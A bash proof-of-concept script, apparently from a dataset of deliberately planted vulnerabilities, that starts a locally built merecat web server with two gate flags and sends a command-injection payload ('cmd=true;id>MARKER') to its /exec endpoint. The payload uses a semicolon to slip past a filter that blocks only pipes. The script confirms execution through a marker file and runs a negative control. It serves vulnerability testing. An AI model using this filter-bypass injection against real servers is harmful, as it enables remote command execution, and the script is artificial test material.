#!/usr/bin/env bash
# PoC for 059_merecat_C2I2S2
# Axes: C2 (struct with enabled+logging) / I2 (buffered snprintf) / S2 (pipe blocked, semicolon bypass)
#
# Vulnerability: the handler blocks '|' but not ';'. The command is buffered
# through snprintf before reaching system(). Both gate flags required.
#
# Gate flags required: --exec-mode --exec-logging
# Exploit payload: cmd=true;id>MARKER  (uses URL-encoded semicolon ;)
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_059_www"
MARKER="/tmp/poc_059_marker"
PORT=18059

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting merecat with --exec-mode --exec-logging on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-mode --exec-logging &
SERVER_PID=$!
sleep 2

# ── trigger: semicolon bypass ──────────────────────────────────────────────────
echo "[*] sending payload: cmd=true;id>$MARKER (semicolon bypasses pipe check)"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=true;id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── show that pipe is blocked ──────────────────────────────────────────────────
echo "[*] verifying S2: pipe character should return 403..."
HTTP_CODE=$(curl -sfg -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${PORT}/exec?cmd=id|tee/tmp/poc_059_pipe" || true)
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] S2 confirmed: pipe blocked with 403"
else
    echo "[!] unexpected S2 response: $HTTP_CODE"
fi

# ── negative control: endpoint absent with only one gate flag ─────────────────
echo "[*] verifying gate: endpoint must be absent with only --exec-mode (no --exec-logging)..."
NEG_PORT=$((19000 + 59))
"$BINARY" -n -p $NEG_PORT "$WWWROOT" --exec-mode &
SAFE_PID=$!
sleep 2
HTTP_CODE=$(curl -sfg -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-logging"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
